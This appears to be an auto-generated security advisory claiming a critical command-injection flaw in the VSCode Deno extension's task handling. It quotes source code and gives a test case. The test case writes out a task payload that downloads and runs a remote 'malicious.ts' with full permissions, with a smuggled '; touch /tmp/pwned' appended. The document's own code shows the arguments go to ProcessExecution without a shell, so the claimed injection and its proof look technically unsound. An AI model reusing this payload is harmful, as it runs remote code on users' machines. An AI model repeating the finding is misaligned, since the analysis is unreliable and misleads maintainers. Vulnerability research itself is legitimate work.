- Vulnerability Name: Command Injection via Task Definitions in `tasks.json` and `deno.json`
- Description:
  The VSCode Deno extension allows users to define tasks in `tasks.json` and `deno.json` files to automate Deno CLI commands. These task definitions can include arbitrary commands and arguments. If a malicious repository provides a crafted `tasks.json` or `deno.json` file with malicious commands, opening the repository in VSCode with the Deno extension enabled could lead to command injection. The vulnerability is triggered when the user interacts with the task, for example, by running it from the tasks sidebar or through the command palette.

  Steps to trigger vulnerability:
    1. Attacker creates a malicious repository containing a `tasks.json` or `deno.json` file.
    2. In the `tasks.json` or `deno.json`, the attacker defines a task with a malicious command, for example, by injecting shell commands into the `command` or `args` fields.
    3. Victim clones or opens the malicious repository in VSCode with the Deno extension enabled.
    4. Victim interacts with the task, e.g., by opening the tasks sidebar and clicking "Run Task" or by using the "Tasks: Run Task" command and selecting the malicious task.
    5. The malicious command injected by the attacker is executed on the victim's machine with the privileges of the VSCode process.

- Impact:
  Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine. This could lead to data theft, system compromise, or further malicious activities.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  None. The extension directly uses the command and arguments from the task definitions to execute commands via `vscode.ProcessExecution`. There is no input sanitization or validation on the task definitions provided by the workspace.

- Missing Mitigations:
    - Input sanitization and validation: Sanitize and validate the `command` and `args` fields in `tasks.json` and `deno.json` task definitions to prevent command injection. Disallow shell metacharacters or escape them properly before passing to `ProcessExecution`.
    - Sandboxing or isolation: Execute tasks in a sandboxed environment with limited privileges to minimize the impact of command injection.
    - User confirmation: Prompt user confirmation before executing tasks defined in workspace configuration files, especially for newly opened workspaces or workspaces from untrusted sources.

- Preconditions:
    - Victim must have the VSCode Deno extension installed and enabled.
    - Victim must open a malicious repository containing a crafted `tasks.json` or `deno.json` file in VSCode.
    - Victim must interact with the malicious task by attempting to run it.

- Source Code Analysis:
    1. **`client/src/tasks.ts` and `client/src/tasks_sidebar.ts`**: These files are responsible for reading and executing tasks. `DenoTasksTreeDataProvider` in `tasks_sidebar.ts` fetches tasks and `DenoTaskProvider` in `tasks.ts` provides tasks. `buildDenoTask` and `buildDenoConfigTask` functions are used to construct `vscode.Task` objects.
    2. **`client/src/tasks.ts#buildDenoTask`**:
       ```typescript
       export function buildDenoTask(
         target: vscode.WorkspaceFolder,
         process: string,
         definition: DenoTaskDefinition,
         name: string,
         args: string[],
         problemMatchers: string[],
       ): vscode.Task {
         const exec = new vscode.ProcessExecution(
           process,
           args, // [VULNERABILITY]: `args` is directly passed to ProcessExecution without sanitization
           definition,
         );

         return new vscode.Task(
           definition,
           target,
           name,
           TASK_SOURCE,
           exec,
           problemMatchers,
         );
       }
       ```
       - The `buildDenoTask` function takes an array of `args` directly from the `DenoTaskDefinition` and passes it to `vscode.ProcessExecution`. This function is used for tasks defined in `tasks.json`.
    3. **`client/src/tasks.ts#buildDenoConfigTask`**:
       ```typescript
       export function buildDenoConfigTask(
         scope: vscode.WorkspaceFolder,
         process: string,
         name: string,
         command: string | undefined,
         sourceUri?: vscode.Uri,
       ): vscode.Task {
         const args = [];
         if (
           sourceUri &&
           vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()
         ) {
           const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
           args.push("-c", configPath);
         }
         args.push(name); // [VULNERABILITY]: `name` (task name from deno.json) is added to args without sanitization
         const task = new vscode.Task(
           {
             type: TASK_TYPE,
             name: name,
             command: "task",
             args, // [VULNERABILITY]: `args` is directly passed to ProcessExecution without sanitization
             sourceUri,
           },
           scope,
           name,
           TASK_SOURCE,
           new vscode.ProcessExecution(process, ["task", ...args]), // [VULNERABILITY]: `args` is directly passed to ProcessExecution without sanitization
           ["$deno"],
         );
         task.detail = `$ ${command}`;
         return task;
       }
       ```
       - The `buildDenoConfigTask` function, used for tasks in `deno.json`, also constructs `vscode.ProcessExecution` with arguments derived from `name` and `args` in `deno.json` without sanitization.
    4. **`client/src/tasks_sidebar.ts#DenoTasksTreeDataProvider.getChildren`**:
       - This function and related classes read task definitions from `deno.json` files using `lsp_extensions.task` request to the Deno language server, and from `tasks.json` using `util.readTaskDefinitions`. These definitions are then used to create `DenoTask` tree items, which, when executed, will use the vulnerable `buildDenoTask` or `buildDenoConfigTask` functions.

       ```typescript
       async getChildren(element?: TreeItem): Promise<TreeItem[]> {
         if (!this.#taskTree) {
           const taskItems = await this.taskProvider.provideTasks(); // For deno.json tasks
           if (taskItems) {
             this.#taskTree = this.#buildTaskTree(taskItems);
             if (this.#taskTree.length === 0) {
               this.#taskTree = [new NoScripts("No scripts found.")];
             }
           }
         }
         // ... (rest of the logic for tasks.json is also here but not directly shown for brevity)
         ...
       }
       ```

    **Visualization**:

    ```
    Malicious tasks.json/deno.json --> DenoTasksTreeDataProvider/DenoTaskProvider --> buildDenoTask/buildDenoConfigTask --> vscode.ProcessExecution --> Command Injection
    ```

- Security Test Case:
  1. Create a new directory named `malicious-repo`.
  2. Inside `malicious-repo`, create a file named `tasks.json` with the following content:
     ```json
     {
       "version": "2.0.0",
       "tasks": [
         {
           "type": "deno",
           "command": "run",
           "args": [
             "-A",
             "-r",
             "https://gist.githubusercontent.com/exampleuser/1234567890abcdef/raw/malicious.ts; touch /tmp/pwned"
           ],
           "problemMatcher": [
             "$deno"
           ],
           "label": "malicious: task1"
         }
       ]
     }
     ```
     Alternatively, create `deno.json` with:
     ```json
     {
       "tasks": {
         "maliciousTask": "run -A -r https://gist.githubusercontent.com/exampleuser/1234567890abcdef/raw/malicious.ts; touch /tmp/pwned"
       }
     }
     ```
     (Note: Replace `https://gist.githubusercontent.com/exampleuser/1234567890abcdef/raw/malicious.ts` with a real URL that serves a harmless Deno script to avoid actual harmful execution in a real test scenario. For demonstration of command injection, the `; touch /tmp/pwned` is key.)

  3. Open VSCode and open the `malicious-repo` directory as a workspace folder. Ensure the Deno extension is enabled for this workspace.
  4. For `tasks.json` test case:
     - Open the Command Palette (Ctrl+Shift+P or Cmd+Shift+P) and type "Tasks: Run Task".
     - Select "malicious: task1".
  5. For `deno.json` test case:
     - Open the "Deno Tasks" sidebar (if visible, otherwise enable it).
     - Locate "maliciousTask" under your workspace.
     - Click the "Run Task" icon next to "maliciousTask".
  6. Observe the execution. If the command injection is successful, a file named `pwned` will be created in the `/tmp/` directory (or user's temp directory depending on OS and injected command).
  7. Verify the file creation by checking `/tmp/pwned`. If the file exists, the command injection vulnerability is confirmed.

This vulnerability allows for arbitrary command execution when a user opens a malicious repository and runs a task defined within it, posing a significant security risk.
